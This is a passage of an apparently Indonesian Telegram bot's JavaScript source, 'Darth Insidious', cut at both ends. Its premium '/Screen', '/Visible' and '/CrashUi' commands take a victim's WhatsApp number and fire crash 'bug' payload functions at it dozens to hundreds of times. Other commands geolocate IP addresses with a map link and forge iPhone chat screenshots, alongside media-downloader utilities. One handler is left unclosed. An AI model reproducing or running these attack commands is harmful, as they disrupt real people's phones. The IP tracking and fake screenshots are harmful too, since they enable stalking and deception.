          [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "💢 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "⚠️ Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Screen
𖥂 Status : 💢 Mengirim Santet...
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
    parse_mode: "Markdown"
  });

  try {
    for (let i = 0; i < 50; i++) {
      await XNecroInvite(target);
      await new Promise(res => setTimeout(res, 300));
      await XNecroInvite(target);
      await new Promise(res => setTimeout(res, 300));
    }

    console.log(chalk.red(`Succes Sending Bug`));

    await bot.editMessageCaption(`\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Screen
𖥂 Status : Succesfuly Sending Bug
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉 」", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    console.error("Screen Error:", err);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});



///----------( Visible )----------\\\
bot.onText(/\/Visible(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const args = match[1];

  if (!args) {
    return bot.sendMessage(
      chatId,
      `💢 *Contoh penggunaan yang benar:*` +
      `\`\`\`\n/Visible 62xxxxxxxxxx\n\`\`\`\n` +
      `🍂 *Keterangan:*\n` +
      `- 62xxxxxxxxxx → Nomor target WhatsApp\n\n` +
      `Contoh lain:\n\`\`\`\n/Visible 6281234567890\n\`\`\`\n` +
      `💢 Akses Terkirim!!.`,
      { parse_mode: "Markdown" }
    );
  }

  const targetNumber = args.trim();
  if (!/^\d+$/.test(targetNumber)) {
    return bot.sendMessage(chatId, "⚠️ Format salah!\nContoh: `/Screen 6281234567890`", {
      parse_mode: "Markdown",
    });
  }

  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const randomImage = getRandomImage();
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
💢 Hei Premium Only!
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "💢 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "⚠️ Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Visible
𖥂 Status : 💢 Mengirim Santet...
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
    parse_mode: "Markdown"
  });

  try {
    for (let i = 0; i < 80; i++) {
      await Nullvisible(Dilz, target);
      await new Promise(res => setTimeout(res, 400));
      await Nullvisible(Dilz, target);
      await new Promise(res => setTimeout(res, 400));
    }

    console.log(chalk.red(`Succes Sending Bug`));

    await bot.editMessageCaption(`\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Visible
𖥂 Status : Succesfuly Sending Bug
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉 」", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    console.error("Screen Error:", err);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});



///----------( CrashUi )-----------\\\
bot.onText(/\/CrashUi(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const args = match[1];

  if (!args) {
    return bot.sendMessage(
      chatId,
      `💢 *Contoh penggunaan yang benar:*` +
      `\`\`\`\n/CrashUi 62xxxxxxxxxx\n\`\`\`\n` +
      `🍂 *Keterangan:*\n` +
      `- 62xxxxxxxxxx → Nomor target WhatsApp\n\n` +
      `Contoh lain:\n\`\`\`\n/CrashUi 6281234567890\n\`\`\`\n` +
      `💢 Akses Terkirim!!.`,
      { parse_mode: "Markdown" }
    );
  }

  const targetNumber = args.trim();
  if (!/^\d+$/.test(targetNumber)) {
    return bot.sendMessage(chatId, "⚠️ Format salah!\nContoh: `/CrashUi 6281234567890`", {
      parse_mode: "Markdown",
    });
  }

  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const randomImage = getRandomImage();
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
💢 Hei Premium Only!
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "💢 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "⚠️ Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : CrashUi
𖥂 Status : 💢 Mengirim Santet...
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
    parse_mode: "Markdown"
  });

  try {
    for (let i = 0; i < 150; i++) {
      await uiAcc(Dilz, target);
      await new Promise(res => setTimeout(res, 400));
      await uiAcc(Dilz, target);
      await new Promise(res => setTimeout(res, 400));
      await uiAcc(Dilz, target);
      await new Promise(res => setTimeout(res, 400));
    }

    console.log(chalk.red(`Succes Sending Bug`));

    await bot.editMessageCaption(`\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : CrashUi
𖥂 Status : Succesfuly Sending Bug
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉 」", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    console.error("Screen Error:", err);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});



///-----------( The Connect )----------\\\
bot.onText(/\/Getcode(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a website URL.\n\nExample:\n/Getcode https://example.com"
    );
  }

  const url = match[1].trim();
  const steps = [
    { percent: 10, text: "Meminta Persetujuan Url..." },
    { percent: 25, text: "Menghubungkan ke Sumber website..." },
    { percent: 45, text: "Mengambil kode sumber..." },
    { percent: 65, text: "Menganalisis struktur HTML..." },
    { percent: 85, text: "Menyusun hasil akhir..." },
    { percent: 100, text: "Selesai!.." }
  ];

  const processingMsg = await bot.sendMessage(
    chatId,
    `⏳ Proses pengambilan kode dari: ${url}\n0% Memulai...`
  );

  for (const step of steps) {
    await delay(600 + Math.random() * 400);
    await bot.editMessageText(
      `⏳ Proses pengambilan kode dari: ${url}\n${step.percent}% ${step.text}`,
      {
        chat_id: chatId,
        message_id: processingMsg.message_id
      }
    ).catch(() => {});
  }

  try {
    const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
    const res = await fetch(apiUrl);
    const data = await res.json();

    if (!data || !data.result) {
      return bot.editMessageText(
        "❌ Gagal mengambil source code. Pastikan URL valid.",
        {
          chat_id: chatId,
          message_id: processingMsg.message_id
        }
      );
    }

    const code = data.result;

    await delay(400);
    if (code.length > 4000) {
      const filePath = `sourcecode_${Date.now()}.html`;
      fs.writeFileSync(filePath, code);

      await bot.editMessageText(`🌹 Selesai! Mengirim file hasil dari: ${url}`, {
        chat_id: chatId,
        message_id: processingMsg.message_id
      });

      await bot.sendDocument(chatId, filePath, {
        caption: `🍒 Full source code from: ${url}`
      });

      fs.unlinkSync(filePath);
    } else {
      await bot.editMessageText(`🍒 Source Code from: ${url}\n\n<code>${code}</code>`, {
        chat_id: chatId,
        message_id: processingMsg.message_id,
        parse_mode: "HTML"
      });
    }
  } catch (err) {
    console.error("GetCode API Error:", err);
    await bot.editMessageText(
      "❌ Error saat mengambil data dari website. Silakan coba lagi.",
      {
        chat_id: chatId,
        message_id: processingMsg.message_id
      }
    );
  }
});



///----------( Pinterest Foto )----------\\\
bot.onText(/\/pinterest(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a search query.\n\nExample:\n/pinterest Robot");
    }

    const query = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result || data.result.length === 0) {
            return bot.sendMessage(chatId, "❌ No Pinterest images found for your query.");
        }

        const firstResult = data.result[0];

        await bot.sendPhoto(chatId, firstResult, {
            caption: `🍒 Pinterest Result for: *${query}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Pinterest API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Pinterest image. Please try again later.");
    }
});



///----------( Tiktok Url )----------\\\
bot.onText(/\/Tiktok(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a TikTok URL.\n\nExample:\n/Tiktok https://vt.tiktok.com/xxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/tiktok?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result || !data.result.video) {
            return bot.sendMessage(chatId, "❌ Failed to fetch TikTok video. Please check the URL.");
        }

        await bot.sendPhoto(chatId, data.result.video, {
            caption: `💢 TikTok Video Downloaded\n\n👤 Author: ${data.result.author || "-"}\n📌 Title: ${data.result.title || "-"}`
        });
    } catch (err) {
        console.error("TikTok API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching TikTok video. Please try again later.");
    }
});



///----------( Instagram Url )----------\\\
bot.onText(/\/Instagram(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/Instagram https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 

        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});



///----------( Sticker Generate )----------\\\
bot.onText(/\/Sticker(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a text.\n\nExample:\n/Sticker Hallo All");
    }

    const text = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(text)}`;

        await bot.sendPhoto(chatId, apiUrl, {
            caption: `🖼️ Ini Hasil Creat\n\n✏️ Text: *${text}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Brat API Error:", err);
        bot.sendMessage(chatId, "❌ Error generating Brat image. Please try again later.");
    }
});



///----------( Lacak Ip )----------\\\
bot.onText(/^\/DarthIP(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match && match[1] ? match[1].trim() : null;

  if (!ip) {
    return bot.sendMessage(chatId, "💢 ☇ Format: /DarthIP 8.8.8.8");
  }

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false;
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return bot.sendMessage(chatId, "❌ ☇ IP tidak valid. Masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar.");
  }

  let processingMsg = await bot.sendMessage(chatId, `🔎 ☇ Tracking IP ${ip} — sedang memproses...`);

  try {
    const steps = [
      { p: 10, text: "Menyiapkan koneksi ke server..." },
      { p: 30, text: "Mengambil data dari API..." },
      { p: 50, text: "Menganalisis lokasi IP..." },
      { p: 75, text: "Menyusun hasil akhir..." },
      { p: 100, text: "Selesai!" },
    ];

    for (const step of steps) {
      await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
      await bot.editMessageText(
        `🔎 ☇ Tracking IP ${ip}\n${step.p}% ${step.text}`,
        { chat_id: chatId, message_id: processingMsg.message_id }
      ).catch(() => {});
    }

    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return bot.editMessageText(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`, {
        chat_id: chatId,
        message_id: processingMsg.message_id,
      });
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + "," + lon)}` : null;

    const caption = `\`\`\`
⬡═―—⊱ ⎧ 𝐎𝐕𝐄𝐑 𝐅𝐋𝐎𝐖𝐗 ⎭ ⊰―—═⬡\`\`\`
⌑ IP: ${data.ip || "-"}
⌑ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⌑ Region: ${data.region || "-"}
⌑ City: ${data.city || "-"}
⌑ ZIP: ${data.postal || "-"}
⌑ Timezone: ${data.timezone_gmt || "-"}
⌑ ISP: ${data.isp || "-"}
⌑ Org: ${data.org || "-"}
⌑ ASN: ${data.asn || "-"}
⌑ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const options = {
      parse_mode: "Markdown",
      reply_markup: mapsUrl
        ? {
            inline_keyboard: [
              [{ text: "⌜🌍⌟ ☇ 𝖧𝖾𝗋𝖾", url: mapsUrl }]
            ]
          }
        : undefined,
    };

    await bot.editMessageText(caption, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
      ...options,
    }).catch(async () => {
      await bot.sendMessage(chatId, caption, options);
    });

  } catch (err) {
    console.error("TrackIP Error:", err);
    await bot.editMessageText(
      "❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti.",
      { chat_id: chatId, message_id: processingMsg.message_id }
    ).catch(async () => {
      await bot.sendMessage(chatId, "❌ ☇ Terjadi kesalahan saat mengambil data IP.");
    });
  }
});



///----------( IPhone Generaten )----------\\\
bot.onText(/^\/IPhoneQ(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>💢 𝖲𝗈𝗋𝗒𝗒 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 𝖴𝗌𝖾𝗋 𝖮𝗇𝗅𝗒!</blockquote>
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "『 𝖠𝗎𝗍𝗁𝗈𝗋 』", url: "https://t.me/dickxmod" }],
                    [{ text: "『 ! 』", url: "https://t.me/testidilz21" }]
                ]
            }
        });
    }
    
    
  if (!input) {
    return bot.sendMessage(chatId,
      "❌ Format salah.\n\nContoh:\n`/IPhoneQ Name | 21:45 | 77 | TELKOMSEL`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split("|").map(p => p.trim());
  const text = parts[0];
  const time = parts[1] || "00:00";
  const battery = parts[2] || "100";
  const carrier = parts[3] || "TELKOMSEL";

  const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

  try {
    await bot.sendChatAction(chatId, "upload_photo");

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    await bot.sendPhoto(chatId, buffer, {
      caption: `\`\`\`
「 💢 Dilz No Mercy 」\`\`\`
━━━━━━━━━━━━━━━━━━
Chat : \`${text}\`
Time : ${time}
Baterry : ${battery}%
Kartu : ${carrier}
━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 Darth Insidious 」\`\`\`
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }],
          [{ text: "「 ! 」", url: "https://t.me/testidilz21" }]
        ]
      }
    });
  } catch (err) {
    console.error(err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses gambar.");
  }
});




///-----------( Notifikasi Developer )----------\\\
bot.onText(/^\/Notif(?:\s+([\s\S]+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
  const message = match[1];

  if (!message) {
    return bot.sendMessage(chatId, `⚠️ *Gunakan format:*\n/Notif <pesan kamu>`, {
      parse_mode: "Markdown",
      reply_to_message_id: msg.message_id,
    });
  }

  try {
    const apiUrl = `https://api.telegram.org/bot${TOKEN_DEVELOPER}/sendMessage`;

    const content = `\`\`\`
「 𝖧𝖺𝗅𝗅𝗈 DilzMod 」\`\`\`
──────────────
💢 NOTIFIKASI BARU DARI PENGGUNA
🍒 Pengirim: ${username}
🆔 ID: ${userId}
💬 Pesan : ${message}
──────────────
`;

    await axios.post(apiUrl, {
      chat_id: ID_DILZ,
      text: content,
      parse_mode: "Markdown",
    });

    await bot.sendMessage(chatId, "💢 Pesan Berhasil Terkirim", {
      reply_to_message_id: msg.message_id,
    });
  } catch (err) {
    console.error("Gagal kirim notif:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengirim pesan ke developer. Coba lagi nanti.", {
      reply_to_message_id: msg.message_id,
    });
  }
});

bot.onText(/^\/File\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const replyMsg = msg.reply_to_message;

  if (!replyMsg || !replyMsg.text) {
    return bot.sendMessage(
      chatId,
      `❌ <b>Reply pesan teks</b> yang ingin dijadikan file.\nContoh:\n<code>/File Lolipop,js</code>`,
      { parse_mode: "HTML" }
    );
  }

  const [rawName, rawType] = input.split(",");
  const fileNamePart = rawName?.trim() || "file";
  const type = rawType?.toLowerCase().trim();

  const validTypes = ["json", "html", "MD", "js", "txt", "py", "css"];
  if (!type || !validTypes.includes(type)) {
    return bot.sendMessage(
      chatId,
      `❌ Format file tidak valid!\nGunakan salah satu:\n<code>${validTypes.join(", ")}</code>`,
      { parse_mode: "HTML" }
    );
  }

  const fileName = `${fileNamePart}_${Date.now()}.${type}`;
  const filePath = path.join(__dirname, fileName);
  const fileContent = replyMsg.text;

  const loadingMsg = await bot.sendMessage(chatId, "⸙ <b>Processing File...</b>", { parse_mode: "HTML" });

  try {
    const steps = ["▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰"];
    for (let i = 0; i < steps.length; i++) {
      await new Promise((r) => setTimeout(r, 300));
      await bot.editMessageText(`📦 Membuat File...\n${steps[i]} ${((i + 1) * 20)}%`, {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: "HTML",
      });
    }

    fs.writeFileSync(filePath, fileContent, "utf8");

    await bot.editMessageText("✅ <b>File berhasil dibuat!</b>\nMengirim file...", {
      chat_id: chatId,
      message_id: loadingMsg.message_id,
      parse_mode: "HTML",
    });

    await bot.sendDocument(chatId, filePath, {
      caption: `☇ File berhasil dibuat!\n⨀ Nama : <b>${fileName}</b>\n📦 Type: <code>${type}</code>`,
      parse_mode: "HTML",
    });

    fs.unlink(filePath, (err) => {
      if (err) console.error("Gagal hapus file:", err);
    });

    await bot.editMessageText("<b>Done!</b> File terkirim ✅", {
      chat_id: chatId,
      message_id: loadingMsg.message_id,
      parse_mode: "HTML",
    });
  } catch (err) {
    console.error("❌ Gagal menulis file:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat membuat file.");
  }
});

bot.onText(/\/cekfunc/, async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "🪧 Reply kode JS atau File .Js untuk dicek!", {
      parse_mode: "Markdown"
    });
  }

  let kodeJS = "";

  if (msg.reply_to_message.document) {
    const fileId = msg.reply_to_message.document.file_id;
    const fileLink = await bot.getFileLink(fileId);

    const fileBuffer = await axios.get(fileLink, { responseType: "arraybuffer" });
    kodeJS = fileBuffer.data.toString();
  }

  if (msg.reply_to_message.text) {
    kodeJS = msg.reply_to_message.text;
  }

  if (!kodeJS) {
    return bot.sendMessage(chatId, "❗ Tidak ada kode Yang ditemukan.");
  }

  bot.sendMessage(chatId, "⏳ CEK FUNCTION...");

  try {
    const result = await cekDenganBackup(kodeJS);

    if (!result.success) {
      return bot.sendMessage(chatId, "⚠ Semua API checker sedang down.");
    }

    const hasil = result.data;

    let text = `<b>Hasil Analisa:</b>\n`;
    text += `<i>Menggunakan API:</i> <code>${result.url}</code>\n\n`;

    if (hasil.errors && hasil.errors.length > 0) {
      text += "❌ <b>Error ditemukan:</b>\n";
      hasil.errors.forEach((e, i) => {
        const msgErr = typeof e === "string" ? e : e.message;
        text += `${i + 1}. <code>${msgErr}</code>\n`;
      });
    } else {
      text += "✅ <b>Tidak ada error!</b>\n";
    }

    if (hasil.warnings && hasil.warnings.length > 0) {
      text += "\n(ꐘ) <b>Peringatan:</b>\n";
      hasil.warnings.forEach((w, i) => {
        const msgWarn = typeof w === "string" ? w : w.message;
        text += `${i + 1}. <code>${msgWarn}</code>\n`;
      });
    }

    return bot.sendMessage(chatId, text, { parse_mode: "HTML" });

  } catch (err) {
    console.log(err);
    bot.sendMessage(chatId, "⚠ Terjadi kesalahan saat memproses kode.");
  }

///----------( Open )----------\\\
bot.onText(/^\/?open$/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  if (!reply || !reply.document) {
    return bot.sendMessage(
      chatId,
      "💢 Reply To File"
    );
  }

  const fileId = reply.document.file_id;
  const fileName = reply.document.file_name;

  try {
    const fileLink = await bot.getFileLink(fileId);
    const res = await fetch(fileLink);
    const content = await res.text();

    const preview =
      content.length > 3800
        ? content.substring(0, 3800) + "\n\n... Sory File Terpotong"
        : content;

    const text = `\`\`\`
「 DilzMod 𝖭𝗈 𝖬𝖾𝗋𝖼𝗒 」\`\`\`
╭─⭓ Isi File ────
│ 🍂 ${fileName}
╰───────────────⭓
──────────────
\`\`\`javascript
${preview}
\`\`\`
──────────────
`;

    await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Gagal membaca file: ${err.message}`);
  }
});



///----------( Tourl Foto / Video )----------\\\
bot.onText(/^\/Tourl$/, async (msg) => {
    const chatId = msg.chat.id;

    if (!msg.reply_to_message || 
        (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah *file/foto/video* dengan command /Tourl", {
            reply_to_message_id: msg.message_id,
            parse_mode: "Markdown"
        });
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        const processingMsg = await bot.sendMessage(chatId, "⏳ Sedang mengupload ke Catbox...", {
            reply_to_message_id: msg.message_id
        });

        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: "stream" });

        const FormData = require("form-data");
        const form = new FormData();
        form.append("reqtype", "fileupload");
        form.append("fileToUpload", response.data, {
            filename: fileName,
            contentType: response.headers["content-type"]
        });

        const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
            headers: form.getHeaders()
        });

        await bot.editMessageText(
            `✅ *Upload berhasil!*\n📎 URL:\n\`${catboxUrl}\``,
            {
                chat_id: chatId,
                message_id: processingMsg.message_id,
                parse_mode: "Markdown"
            }
        );

    } catch (error) {
        console.error("Error in /tourl:", error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox", {
            reply_to_message_id: msg.message_id
        });
    }
});

bot.onText(/^\/play(?:@[\w_]+)?\s*(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id;  
    const searchText = match[1]?.trim();
    
    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>💢 𝖲𝗈𝗋𝗒𝗒 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 𝖴𝗌𝖾𝗋 𝖮𝗇𝗅𝗒!</blockquote>
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
